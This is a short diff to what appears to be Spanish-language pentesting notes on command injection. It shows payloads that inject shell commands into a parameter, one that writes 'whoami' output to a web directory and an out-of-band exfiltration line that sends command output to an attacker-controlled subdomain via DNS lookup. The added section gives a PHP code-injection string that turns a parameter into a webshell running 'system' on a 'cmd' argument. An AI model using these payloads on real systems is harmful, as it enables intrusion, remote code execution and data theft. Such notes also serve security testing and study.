@@ -77,3 +77,8 @@ parametro = || whoami > /var/www/static/whoami.txt ||
 Out-of-band exfiltration:
 x || nslockup 'whoami'.servidor-del-atacante.com ||
 Nos llegara una request a un subdominio con los datos del comando ejecutado.
+
+
+################## Code injection en un parametro php:
+podemos crear una webshell en un parámetro php que ejecuta código de la siguiente manera:
+parameter = ${system($_GET[cmd])}&cmd=
